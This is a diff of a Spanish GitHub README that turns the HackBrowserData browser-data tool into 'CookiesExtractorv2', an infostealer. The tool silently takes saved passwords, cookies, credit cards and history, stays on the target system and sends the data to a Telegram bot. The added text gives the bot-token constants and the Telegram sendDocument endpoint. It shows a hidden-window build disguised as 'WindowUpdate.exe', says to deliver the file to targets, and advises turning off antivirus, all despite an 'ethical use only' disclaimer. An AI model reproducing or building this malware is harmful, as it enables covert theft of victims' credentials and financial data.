@@ -1,15 +1,14 @@
-<div align="center">
-</div> 
+CookiesExtractorv2
+CookiesExtractorv2 es una herramienta desarrollada en Go diseñada para extraer datos sensibles de navegadores web (contraseñas, historial, cookies, marcadores, tarjetas de crédito, historial de descargas, localStorage y extensiones). A diferencia de la herramienta base, esta versión opera de forma discreta en segundo plano, recolecta los datos extraídos y los envía automáticamente a un bot de Telegram configurado. Soporta los navegadores más populares en Windows, macOS y Linux, e incluye mecanismos para su persistencia y ocultamiento en el sistema objetivo.
 
-# HackBrowserData
+Advertencia Importante:
+Esta herramienta es una modificación del proyecto original HackBrowserData y ha sido configurada para operar de manera autónoma, recolectando datos de navegación y enviándolos a un destino remoto (Telegram). Su uso implica la extracción y transmisión de información sensible del sistema donde se ejecuta.
 
-[![Lint](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/lint.yml/badge.svg)](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/lint.yml) [![Build](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/build.yml/badge.svg)](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/build.yml) [![Release](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/release.yml/badge.svg)](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/release.yml) [![Tests](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/GrpDsG20/CookiesExtractorv2/actions/workflows/test.yml) [![Coverage Status](https://coveralls.io/repos/github/GrpDsG20/CookiesExtractorv2/badge.svg)](https://coveralls.io/github/GrpDsG20/CookiesExtractorv2)
+Esta herramienta está destinada EXCLUSIVAMENTE para fines de investigación de seguridad y pruebas de penetración ÉTICAS en entornos controlados y con el CONSENTIMIENTO EXPLÍCITO Y DOCUMENTADO del propietario del sistema.
 
-`HackBrowserData` is a command-line tool for decrypting and exporting browser data (passwords, history, cookies, bookmarks, credit cards, download history, localStorage and extensions) from the browser. It supports the most popular browsers on the market and runs on Windows, macOS and Linux.
+Cualquier uso no autorizado de este software para acceder, recopilar o exfiltrar datos sin el permiso expreso del propietario del sistema es ILEGAL y NO ÉTICO. El autor y los contribuidores no asumen ninguna responsabilidad legal o moral por cualquier uso indebido o ilegal de esta herramienta.
 
-> Disclaimer: This tool is only intended for security research. Users are responsible for all legal and related liabilities resulting from the use of this tool. The original author does not assume any legal responsibility.
-
-## Supported Browser
+Navegadores Compatibles
 
 ### Windows
 | Browser            | Password | Cookie | Bookmark | History |
@@ -76,119 +75,49 @@ Based on Apple's security policy, some browsers **require a current user passwor
 | Firefox Nightly    |    ✅     |   ✅    |    ✅     |    ✅    |
 
 
-## Getting started
+Instalación
+La instalación de CookiesExtractorv2 es muy sencilla:
+Descarga el proyecto o clona el repositorio
 
-### Install
+# Clona tu repositorio
+git clone https://github.com/GrpDsG20/CookiesExtractorv2
 
-Installation of `HackBrowserData` is dead-simple, just download [the release for your system](https://github.com/GrpDsG20/CookiesExtractorv2/releases) and run the binary.
+Configura tu bot de Telegram:
+Antes de compilar, necesitas editar el archivo main.go en la ruta cmd/hack-browser-data/main.go. Busca las líneas TelegramToken y ChatID y reemplaza los valores por tu propio token de bot de Telegram y el ID de tu chat.
 
-> In some situations, this security tool will be treated as a virus by Windows Defender or other antivirus software and can not be executed. The code is all open source, you can modify and compile by yourself.
+const (
+    TelegramToken   = "TU_TOKEN_DE_BOT_AQUI" // Reemplaza esto con tu token real
+    ChatID          = "TU_CHAT_ID_AQUI"     // Reemplaza esto con tu ID de chat real
+    TelegramFileAPI = "https://api.telegram.org/bot%s/sendDocument"
+)
 
-### Building from source
+# Navega a la raíz de tu proyecto
+cd CookiesExtractorv2
 
-only support `go 1.20+` with go generics.
+# Inicializa y limpia tu módulo (si aún no lo has hecho)
+go mod tidy
 
-```bash
-$ git clone https://github.com/GrpDsG20/CookiesExtractorv2
+# Navega hasta este apartado
+cd cmd\hack-browser-data
 
-$ cd HackBrowserData/cmd/hack-browser-data
+# Compila el ejecutable (desde la raíz del módulo)
+go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe
 
-$ go build
-```
+# Envia el .exe por cualquier medio descargalo y ejecutalo 
 
-### Cross compile
-
-Here's an example of use `macOS` building for `Windows` and `Linux`
-
-#### For Windows
-
-```shell
-GOOS=windows GOARCH=amd64 go build
-```
-
-#### For Linux
-
-````shell
-GOOS=linux GOARCH=amd64 go build
-````
-
-### Run
-
-You can double-click to run, or use command line.
-
-```powershell
-PS C:\Users\moond4rk\Desktop> .\hack-browser-data.exe -h
-NAME:
-   hack-browser-data - Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser
-USAGE:
-   [hack-browser-data -b chrome -f json --dir results --zip]
-   Export all browsing data (passwords/cookies/history/bookmarks) from browser
-   Github Link: https://github.com/GrpDsG20/CookiesExtractorv2
-VERSION:
-   0.4.6
-
-GLOBAL OPTIONS:
-   --verbose, --vv                   verbose (default: false)
-   --compress, --zip                 compress result to zip (default: false)
-   --browser value, -b value         available browsers: all|360|brave|chrome|chrome-beta|chromium|coccoc|dc|edge|firefox|opera|opera-gx|qq|sogou|vivaldi|yandex (default: "all")
-   --results-dir value, --dir value  export dir (default: "results")
-   --format value, -f value          output format: csv|json (default: "csv")
-   --profile-path value, -p value    custom profile dir path, get with chrome://version
-   --full-export, --full             is export full browsing data (default: true)
-   --help, -h                        show help
-   --version, -v                     print the version
-
-```
-
-For example, the following is an automatic scan of the browser on the current computer, outputting the decryption results in `JSON` format and compressing as `zip`.
-
-```powershell
-PS C:\Users\moond4rk\Desktop> .\hack-browser-data.exe -b all -f json --dir results --zip
-
-PS C:\Users\moond4rk\Desktop> ls -l .\results\
-    Directory: C:\Users\moond4rk\Desktop\results
-    
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----         7/15/2024  10:55 PM          44982 results.zip
-```
+Nota: En algunas situaciones, esta herramienta de seguridad puede ser detectada como un virus por Windows Defender u otro software antivirus y no podrá ejecutarse. Es recomendable desactivar el antivirus temporalmente, como si instalaras cualquier programa "crackeado". El código es de código abierto, puedes modificarlo y compilarlo tú mismo. Ten en cuenta que esta versión modificada está diseñada para operar de forma sigilosa y enviar datos a un bot de Telegram, lo cual es la razón principal de tales detecciones.
 
 
-### Run with custom browser profile folder
+Compilación cruzada (Cross compile)
+Aquí tienes un ejemplo de cómo usar macOS para compilar para Windows y Linux. Asegúrate de estar en la raíz de tu módulo (CookiesExtractorv2) cuando ejecutes estos comandos.
 
-If you want to export data from a custom browser profile folder, you can use the `-p` parameter to specify the path of the browser profile folder. PS: use double quotes to wrap the path.
-```powershell
-PS C:\Users\moond4rk\Desktop> .\hack-browser-data.exe -b chrome -p "C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default"
+Para Windows
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe ./cmd/hack-browser-data
 
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_creditcard.csv success  
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_bookmark.csv success  
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_cookie.csv success  
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_history.csv success  
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_download.csv success  
-[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_password.csv success  
-```
+Para Linux
+GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o WindowUpdate ./cmd/hack-browser-data
 
-## Contributing
+Ejecución
+Importante: Esta versión de la herramienta está diseñada para ejecutarse de forma sigilosa en segundo plano. Los ejemplos de comandos que se muestran a continuación corresponden al comportamiento de la herramienta original para exportación local y para fines de depuración o prueba de sus capacidades de extracción, no a la operación normal de esta versión modificada.
 
-We welcome and appreciate any contributions made by the community (GitHub issues/pull requests, email feedback, etc.).
-
-Please see the [Contribution Guide](CONTRIBUTING.md) before contributing.
-
-
-## Contributors
-
-![](/CONTRIBUTORS.svg)
-
-## Stargazers over time
-[![Star History Chart](https://api.star-history.com/svg?repos=GrpDsG20/CookiesExtractorv2&type=Date)](https://github.com/GrpDsG20/CookiesExtractorv2)
-
-
-## 404StarLink 2.0 - Galaxy
-`HackBrowserData` is a part of 404Team [StarLink-Galaxy](https://github.com/knownsec/404StarLink2.0-Galaxy), if you have any questions about `HackBrowserData` or want to find a partner to communicate with，please refer to the [Starlink group](https://github.com/knownsec/404StarLink2.0-Galaxy#community).
-<a href="https://github.com/knownsec/404StarLink2.0-Galaxy" target="_blank"><img src="https://raw.githubusercontent.com/knownsec/404StarLink-Project/master/logo.png" align="middle"/></a>
-
-##  JetBrains OS licenses
-``HackBrowserData`` had been being developed with `GoLand` IDE under the **free JetBrains Open Source license(s)** granted by JetBrains s.r.o., hence I would like to express my thanks here.
-
-<a href="https://www.jetbrains.com/?from=HackBrowserData" target="_blank"><img src="https://raw.githubusercontent.com/moonD4rk/staticfiles/master/picture/jetbrains-variant-4.png" width="256" align="middle"/></a>
 
